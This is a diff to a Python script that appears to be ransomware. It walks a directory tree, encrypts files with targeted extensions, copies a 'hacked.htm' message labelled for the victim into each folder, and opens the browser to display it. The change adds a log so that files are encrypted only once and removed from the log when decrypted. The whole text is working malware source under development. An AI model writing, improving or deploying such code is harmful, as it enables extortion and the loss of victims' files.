@@ -24,8 +24,8 @@ def main(argv):
     message_to_victim = "hacked.htm"
 
     '''
-    Only imports module relevant to the mode. This means encrypt and decrypt 
-    can be separated. If the decrypt module is missing, the program opens the 
+    Only imports module relevant to the mode. This means encrypt and decrypt
+    can be separated. If the decrypt module is missing, the program opens the
     browser and displays the message
     '''
     if mode == 'encrypt':
@@ -55,6 +55,8 @@ def main(argv):
     the path and pass it to either encrypt or decrypt depending on the mode.
     If encrypting, copy the message file to each folder with encrypted files.
     If decrypting, delete the message file from those folders.
+    Logfile is generated with names of files as they are encrypted
+    Filenames deleted from the log as files are decrypted
     '''
     for root, subdir, files in os.walk(path):
         check = 0
@@ -62,14 +64,17 @@ def main(argv):
             if filename.endswith(tuple(ext)):
                 filename = os.path.join(root, filename)
                 if mode == 'encrypt':
-                    encrypt(key, mode, filename)
+                    if checkLog(filename) is False:
+                        addToLog(filename)
+                        encrypt(key, mode, filename)
                     if check == 0:
                         copy(message_to_victim, root)
                         check = 1
                 elif mode == 'decrypt':
                     if filename == os.path.join(root, message_to_victim):
                         os.remove(filename)
-                    else:
+                    elif checkLog(filename[:-10]):
+                        deleteFromLog(filename)
                         decrypt(key, mode, filename)
 
     # When encryption is finished, open the browser and display the message.
